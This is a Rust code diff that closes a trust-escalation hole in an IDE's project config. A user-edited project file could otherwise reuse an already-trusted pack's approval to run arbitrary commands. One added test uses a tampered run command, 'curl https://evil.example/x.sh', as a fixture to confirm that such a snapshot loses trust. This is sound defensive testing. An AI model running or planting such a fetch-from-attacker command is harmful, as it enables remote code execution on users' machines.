@@ -227,6 +227,7 @@ pub struct ProjectConfig {
     ///   1. `cfg.toolchain` when present (this snapshot)
     ///   2. lang pack's toolchain (lang-pack starter templates that don't override)
     ///   3. built-in Deno runner
+    ///
     /// Users may hand-edit these argv in `nanobpm.project.json`; a future
     /// "Reset toolchain from pack" action can opt into upstream updates.
     #[serde(default, skip_serializing_if = "Option::is_none")]
@@ -382,6 +383,9 @@ fn autoheal_toolchain(cfg: &mut ProjectConfig) {
         pack: m.id.clone(),
         version: super::extensions::pack_version(&m.id),
     });
+    // Mtime bump so project tile ordering / "last updated" stays consistent
+    // with what just changed on disk.
+    cfg.updated_ms = now_ms();
     // Persist so we don't reheal on every read. Ignore write errors — the
     // in-memory config is still correct for this Run/Compile.
     let _ = write_config(&cfg.name, cfg);
@@ -1590,9 +1594,39 @@ pub struct ProjectSupervisor {
 
 static SUPERVISOR: OnceLock<ProjectSupervisor> = OnceLock::new();
 
+/// Returns the trust-store ext id to gate a snapshotted argv on. `nanobpm.project.json`
+/// is user-editable, so we cannot naively trust `cfg.scaffolded_from.pack` — a
+/// project could otherwise claim to have been scaffolded by any already-trusted
+/// pack and then run arbitrary argv under that pack's approval. We only credit
+/// `scaffolded_from.pack` when its currently-installed manifest still declares
+/// the same argv; anything else (pack uninstalled, pack updated to a different
+/// toolchain, user edited the snapshot) falls back to `cfg.lang`, forcing the
+/// user to explicitly approve running unrecognised commands.
+fn snapshot_trust_id(cfg: &ProjectConfig, snapshot_argv: &[String], kind: ArgvKind) -> String {
+    if let Some(sf) = cfg.scaffolded_from.as_ref()
+        && let Some(m) = super::extensions::find_ext(&sf.pack)
+    {
+        let declared = match kind {
+            ArgvKind::Run => &m.toolchain.run,
+            ArgvKind::Compile => &m.toolchain.compile,
+        };
+        if !declared.is_empty() && declared.as_slice() == snapshot_argv {
+            return sf.pack.clone();
+        }
+    }
+    cfg.lang.clone()
+}
+
+#[derive(Copy, Clone)]
+enum ArgvKind {
+    Run,
+    Compile,
+}
+
 /// Resolves the Run argv + the trust-store ext id gating it, in order:
 ///   1. `cfg.toolchain.run` snapshotted at scaffold time — trust binds to
-///      `scaffoldedFrom.pack` (the origin) when known, else to `cfg.lang`.
+///      `scaffoldedFrom.pack` only when the installed pack still declares the
+///      identical argv (see [`snapshot_trust_id`]); otherwise `cfg.lang`.
 ///   2. Lang pack's `toolchain.run` (covers lang-pack starter templates that
 ///      don't override, e.g. plain Rust) — trust binds to the lang pack.
 ///   3. `None` — the caller falls through to the built-in Deno runner.
@@ -1600,11 +1634,7 @@ fn resolve_run_argv(cfg: &ProjectConfig) -> Option<(Vec<String>, String)> {
     if let Some(tc) = cfg.toolchain.as_ref()
         && !tc.run.is_empty()
     {
-        let trust = cfg
-            .scaffolded_from
-            .as_ref()
-            .map(|s| s.pack.clone())
-            .unwrap_or_else(|| cfg.lang.clone());
+        let trust = snapshot_trust_id(cfg, &tc.run, ArgvKind::Run);
         return Some((tc.run.clone(), trust));
     }
     if cfg.lang != "deno"
@@ -1621,11 +1651,7 @@ fn resolve_compile_argv(cfg: &ProjectConfig) -> Option<(Vec<String>, String)> {
     if let Some(tc) = cfg.toolchain.as_ref()
         && !tc.compile.is_empty()
     {
-        let trust = cfg
-            .scaffolded_from
-            .as_ref()
-            .map(|s| s.pack.clone())
-            .unwrap_or_else(|| cfg.lang.clone());
+        let trust = snapshot_trust_id(cfg, &tc.compile, ArgvKind::Compile);
         return Some((tc.compile.clone(), trust));
     }
     if cfg.lang != "deno"
@@ -2548,6 +2574,18 @@ mod tests {
     /// uninstalled since — the whole point of snapshotting.
     #[test]
     fn resolve_run_argv_prefers_project_snapshot_over_lang_pack() {
+        let _g = lock();
+        let ext = temp_root().join("ext-store");
+        let pack = ext.join("nanobpm__app-embedded-jvm");
+        std::fs::create_dir_all(&pack).unwrap();
+        std::fs::write(
+            pack.join("nano-ide.ext.json"),
+            r#"{"id":"embedded-jvm","kind":"app","displayName":"Embedded JVM",
+                 "toolchain":{"run":["mvn","-f","microservice/pom.xml"],"compile":[]}}"#,
+        )
+        .unwrap();
+        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &ext) };
+
         let mut cfg = ProjectConfig::new("p", "");
         cfg.lang = "java".to_string();
         cfg.toolchain = Some(ProjectToolchain {
@@ -2560,9 +2598,47 @@ mod tests {
         });
         let (argv, trust) = resolve_run_argv(&cfg).expect("snapshot must resolve");
         assert_eq!(argv, vec!["mvn", "-f", "microservice/pom.xml"]);
-        // Trust binds to the source pack — approving `embedded-jvm` (not `java`)
-        // covers the project's snapshotted invocation.
+        // Trust binds to the source pack — the installed manifest still
+        // declares the identical argv, so approving `embedded-jvm` covers
+        // the project's snapshotted invocation.
         assert_eq!(trust, "embedded-jvm");
+        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
+    }
+
+    /// Guardrail against a user-editable `nanobpm.project.json` claiming
+    /// `scaffoldedFrom.pack = <already-trusted-pack>` while the snapshot argv
+    /// does not match anything the pack actually declares. In that case the
+    /// trust binding must fall back to `cfg.lang` so the user is forced to
+    /// explicitly approve the unfamiliar command.
+    #[test]
+    fn resolve_run_argv_snapshot_mismatch_falls_back_to_lang() {
+        let _g = lock();
+        let ext = temp_root().join("ext-store");
+        let pack = ext.join("nanobpm__app-embedded-jvm");
+        std::fs::create_dir_all(&pack).unwrap();
+        std::fs::write(
+            pack.join("nano-ide.ext.json"),
+            r#"{"id":"embedded-jvm","kind":"app","displayName":"Embedded JVM",
+                 "toolchain":{"run":["mvn","-f","microservice/pom.xml","exec:java"],"compile":[]}}"#,
+        )
+        .unwrap();
+        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &ext) };
+
+        let mut cfg = ProjectConfig::new("p", "");
+        cfg.lang = "java".to_string();
+        // Tampered snapshot: claims embedded-jvm scaffolded it but the argv
+        // is not what the installed pack declares.
+        cfg.toolchain = Some(ProjectToolchain {
+            run: vec!["curl".into(), "https://evil.example/x.sh".into()],
+            compile: vec![],
+        });
+        cfg.scaffolded_from = Some(ScaffoldedFrom {
+            pack: "embedded-jvm".into(),
+            version: None,
+        });
+        let (_argv, trust) = resolve_run_argv(&cfg).expect("resolves");
+        assert_eq!(trust, "java", "trust must not credit tampered snapshot");
+        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
     }
 
     /// A plain Deno project (no snapshot, `lang=deno`) resolves to `None` so
